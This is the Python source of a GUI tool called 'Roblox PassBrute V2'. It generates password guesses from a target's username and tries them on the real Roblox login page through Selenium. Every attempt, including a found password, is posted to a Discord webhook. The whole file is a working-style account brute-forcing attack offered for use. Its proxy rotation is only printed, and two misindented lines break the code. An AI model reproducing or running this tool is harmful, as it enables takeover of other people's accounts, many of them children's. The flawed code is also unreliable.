# Copyright (c) (https://discord.gg/pQUFjaJ2EN)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import sys
import time
import random
import requests
import os
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox)
from PyQt5.QtCore import Qt
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options

markov_patterns = [
    "{username}{special}{number}",
    "{username}{number}{special}",
    "{special}{username}{number}",
    "{username}{common_word}{special}",
    "{common_word}{username}{number}",
    "{username}{number}",
    "{username}{special}",
    "{username}{number}{special}{common_word}",
    "{common_word}{special}{username}{number}",
    "{special}{common_word}{username}{number}{special}"
]

common_specials = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=', '?', '/']
common_numbers = [str(i) for i in range(1000)]
common_words = ['password', 'secure', 'admin', 'pass', 'login', 'user', 'access', 'key', 'root', 'guest']

proxies = [
    "154.65.39.7:80", "154.65.39.8:80", "148.230.195.165:6969", "2.179.193.146:80",
    "168.132.150.37:8080", "86.77.217.16:8081", "31.62.179.218:5472", "185.105.182.189:80",
    "103.179.252.167:8181", "103.191.115.252:82", "181.78.21.74:999", "181.78.21.38:999",
    "8.28.152.111:80", "103.158.162.18:8000"
]

class InputWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Roblox PassBrute V2 - Webhook & Username")
        self.setFixedSize(600, 400)
        self.setStyleSheet("background-color: #0f0f17; color: #A855F7; font-size: 18px;")

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        self.webhookInput = QLineEdit()
        self.webhookInput.setPlaceholderText("Enter Webhook URL...")
        self.webhookInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.usernameInput = QLineEdit()
        self.usernameInput.setPlaceholderText("Enter Roblox Username...")
        self.usernameInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.startButton = QPushButton("Start PassBrute V2")
        self.startButton.setStyleSheet("background-color: #A855F7; color: white; padding: 15px; font-size: 22px;")
        self.startButton.clicked.connect(self.start_pass_brute)

        layout.addWidget(QLabel("Webhook URL:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.webhookInput, alignment=Qt.AlignCenter)
        layout.addWidget(QLabel("Roblox Username:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.usernameInput, alignment=Qt.AlignCenter)
        layout.addWidget(self.startButton, alignment=Qt.AlignCenter)

        self.setLayout(layout)

    def generate_markov_passwords(self, username, limit=5000):
        guesses = set()
        for pattern in markov_patterns:
            for special in common_specials:
                for number in common_numbers:
                    for word in common_words:
                        guess = pattern.format(username=username, special=special, number=number, common_word=word)
                        guesses.add(guess)
                        if len(guesses) >= limit:
                            return list(guesses)
        return list(guesses)

    def start_pass_brute(self):
        webhook_url = self.webhookInput.text().strip()
        username = self.usernameInput.text().strip()

        if not webhook_url or not username:
            QMessageBox.warning(self, "Error", "Please enter both a valid webhook URL and a Roblox username.")
            return

        passwords = self.generate_markov_passwords(username)
        proxy_index = 0
        tries_since_last_proxy = 0

        print(f"🔌 Using proxy: {proxies[proxy_index]}")

        for index, password in enumerate(passwords):
            try:
                chrome_driver_path = os.path.join(os.getcwd(), 'chromedriver.exe')
                options = Options()
            options.add_argument('--incognito')
            options.add_argument('--disable-extensions')

                driver = webdriver.Chrome(service=Service(chrome_driver_path), options=options)
                driver.get("https://www.roblox.com/login")

                time.sleep(2)

                username_box = driver.find_element(By.ID, "login-username")
                password_box = driver.find_element(By.ID, "login-password")
                login_button = driver.find_element(By.ID, "login-button")

                username_box.clear()
                password_box.clear()

                username_box.send_keys(username)
                password_box.send_keys(password)
                login_button.click()

                time.sleep(3)

                if "home" in driver.current_url.lower():
                    print(f"✅ SUCCESS with password: {password}")
                    if webhook_url:
                        try:
                            requests.post(webhook_url, json={"content": f"✅ Logged in successfully! Password: {password}"})
                        except Exception as e:
                            print(f"Webhook error: {e}")
                    driver.quit()
                    return  

                else:
                    print(f"❌ Failed attempt with: {password}")

                driver.quit()

                if webhook_url:
                    try:
                        requests.post(webhook_url, json={"content": f"❌ Tried: {password}"})
                    except Exception as e:
                        print(f"Webhook error: {e}")

                tries_since_last_proxy += 1
                if tries_since_last_proxy >= 3:
                    proxy_index = (proxy_index + 1) % len(proxies)
                    print(f"🔁 Rotated to new proxy: {proxies[proxy_index]}")
                    tries_since_last_proxy = 0

                time.sleep(random.uniform(1, 2))

            except Exception as e:
                print(f"⚠️ Error during attempt: {e}")

        print("🔚 Finished all password attempts.")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = InputWindow()
    window.show()
    sys.exit(app.exec_())
